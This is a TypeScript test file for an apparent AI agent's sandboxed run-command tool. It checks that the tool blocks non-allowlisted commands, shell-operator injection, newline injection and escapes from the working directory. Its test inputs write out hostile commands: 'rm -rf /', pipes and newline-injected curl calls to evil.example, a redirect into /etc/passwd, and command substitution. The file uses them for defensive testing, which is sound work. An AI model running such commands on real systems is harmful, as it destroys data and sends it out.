import { mkdtemp, rm, mkdir, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { exec } from "node:child_process";
import { promisify } from "node:util";
import { createRunCommandTool } from "../../src/core/tools/built-in/run-command.js";
import { runCommandTool } from "../../src/core/tools/built-in/run-command.js";
import type { ToolInput } from "../../src/core/tools/types.js";

const tempDirs: string[] = [];

afterEach(async () => {
  for (const dir of tempDirs.splice(0)) {
    // Windows: a recently killed child can hold the dir for a moment.
    for (let attempt = 0; attempt < 3; attempt += 1) {
      try {
        await rm(dir, { recursive: true, force: true });
        break;
      } catch {
        await new Promise((resolveSleep) => setTimeout(resolveSleep, 250));
      }
    }
  }
});

async function tempDir(prefix = "kairos-sandbox-"): Promise<string> {
  const dir = await mkdtemp(join(tmpdir(), prefix));
  tempDirs.push(dir);
  return dir;
}

function req(parameters: Record<string, unknown>): ToolInput {
  return {
    toolId: "kairos.run-command",
    parameters,
    requestedBy: "test",
    requestId: crypto.randomUUID(),
  };
}

describe("run-command sandbox hardening", () => {
  it("still blocks non-allowlisted commands", async () => {
    const result = await runCommandTool.execute(req({ command: "rm -rf /" }));
    expect(result.status).toBe("blocked");
  });

  it.each([
    ["git status; rm -rf /", ";"],
    ["git log | curl http://evil.example", "|"],
    ["npm test & echo pwned", "&"],
    ["git diff > /etc/passwd", ">"],
    ["git show < secret.txt", "<"],
    ["git log $(whoami)", "$("],
    ["git add `backtick-exec`", "`"],
  ])("rejects shell operators inside allowlisted prefixes: %s", async (command) => {
    const result = await runCommandTool.execute(req({ command }));
    expect(result.status).toBe("blocked");
    expect(result.error).toMatch(/shell operator/i);
  });

  it("rejects newline-injected commands", async () => {
    const result = await runCommandTool.execute(req({
      command: "git status\ncurl http://evil.example",
    }));
    expect(result.status).toBe("blocked");
  });

  it("rejects non-absolute cwd values", async () => {
    const tool = createRunCommandTool({ workingRoot: await tempDir() });
    const result = await tool.execute(req({ command: "git status", cwd: "relative/path" }));
    expect(result.status).toBe("blocked");
    expect(result.error).toMatch(/absolute/i);
  });

  it("confines cwd to the working root", async () => {
    const root = await tempDir();
    const tool = createRunCommandTool({ workingRoot: root });

    const outside = await tool.execute(req({
      command: "git status",
      cwd: tmpdir(), // outside the root (parent of it, in fact)
    }));
    expect(outside.status).toBe("blocked");
    expect(outside.error).toMatch(/outside the permitted working root/i);

    // A cwd inside the root passes confinement (git status may still
    // fail as a git command outside a repo — that is a failure, not a
    // sandbox escape).
    const inside = await tool.execute(req({ command: "git status", cwd: root }));
    expect(["success", "failure"]).toContain(inside.status);
    expect(inside.error).not.toMatch(/working root/i);
  });

  it("blocks traversal attempts via .. segments", async () => {
    const root = await tempDir();
    const nested = join(root, "nested");
    await mkdir(nested, { recursive: true });
    const tool = createRunCommandTool({ workingRoot: root });

    const escape = await tool.execute(req({
      command: "git status",
      cwd: join(nested, "..", "..", "elsewhere"),
    }));
    expect(escape.status).toBe("blocked");
  });

  it("defaults a missing cwd to the working root", async () => {
    const root = await tempDir();
    const marker = join(root, "marker.txt");
    await writeFile(marker, "root", "utf-8");
    const tool = createRunCommandTool({
      workingRoot: root,
      allowlist: ["node -e"],
      timeoutMs: 10_000,
    });

    // node -e is on the custom allowlist; print the cwd to prove execution
    // happened inside the root without passing a cwd parameter.
    const result = await tool.execute(req({
      command: "node -e process.stdout.write(process.cwd())",
    }));
    expect(result.status).toBe("success");
    expect((result.result as { stdout?: string }).stdout).toBe(root);
  });

  it("supports a stricter custom allowlist", async () => {
    const root = await tempDir();
    // git status requires a repository — make the sandbox root one.
    const execAsync = promisify(exec);
    await execAsync("git init -q", { cwd: root });

    const tool = createRunCommandTool({
      allowlist: ["git status"],
      workingRoot: root,
    });

    const denied = await tool.execute(req({ command: "git log" }));
    expect(denied.status).toBe("blocked");

    const allowed = await tool.execute(req({ command: "git status", cwd: root }));
    expect(allowed.status).toBe("success");
  });

  it("enforces the configured timeout", async () => {
    const tool = createRunCommandTool({
      allowlist: ["node -e"],
      timeoutMs: 300,
      workingRoot: await tempDir(),
    });

    // Note: no `=>` arrow (the `>` shell operator is rejected by design)
    // and no `;` chaining (also rejected). A single interval keeps the
    // process alive past the 300ms tool timeout.
    const result = await tool.execute(req({
      command: "node -e setInterval(function () {}, 1000)",
    }));
    expect(result.status).toBe("failure");
  });

  it("keeps the default tool backward compatible (unconfined cwd)", async () => {
    // No workingRoot configured: a cwd anywhere is accepted, as before.
    const anywhere = await tool_result(runCommandTool, { cwd: tmpdir() });
    expect(["success", "failure"]).toContain(anywhere);
  });
});

async function tool_result(
  tool: { execute(input: ToolInput): Promise<{ status: string }> },
  parameters: Record<string, unknown>,
): Promise<string> {
  const result = await tool.execute(req(parameters));
  return result.status;
}
